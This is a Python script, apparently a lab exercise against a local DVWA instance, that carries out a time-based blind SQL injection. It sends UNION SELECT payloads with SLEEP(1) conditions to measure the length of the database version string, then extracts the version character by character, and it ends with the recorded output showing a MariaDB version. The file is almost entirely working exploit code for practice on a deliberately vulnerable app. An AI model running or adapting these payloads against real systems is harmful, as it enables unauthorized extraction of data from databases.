import string
import time
import urllib

import requests

HOST = "127.0.0.1"
URL = f"http://{HOST}/vulnerabilities/sqli_blind/?"
PHPSESSID = "1m5puhnra2lui353bvo0ot8s51"

session = requests.Session()
session.cookies.set_cookie(cookie=requests.cookies.create_cookie(name="PHPSESSID", value=PHPSESSID))
session.cookies.set_cookie(cookie=requests.cookies.create_cookie(name="security", value="low"))

version_length = 0

for i in range(50):
    sqli = f"' UNION SELECT IF(version() LIKE '{'_' * i}', SLEEP(1), ''), '"

    start = time.time()

    session.get(url=f"{URL}id={sqli}&Submit=Submit#")

    if round(time.time() - start, 2) >= 1:
        version_length = i
        break

print(f"length of the version string is: {version_length} symbols")

version = ""

beginning = time.time()

for _ in range(version_length):
    for c in string.printable.replace("%", ""):
        sqli = urllib.parse.quote(f"' UNION SELECT IF(version() LIKE '{version}{c}%', SLEEP(1), ''), '")

        start = time.time()

        session.get(url=f"{URL}id={sqli}&Submit=Submit#")

        if round(time.time() - start, 2) >= 1:
            version += c
            break

print(f"time: {round(time.time() - beginning, 2)} c")

print(f"version of db is: {version}")

"""
length of the version string is: 24 symbols
time: 26.93 c
version of db is: 10.1.26-MariaDB-0+deb9u1
"""
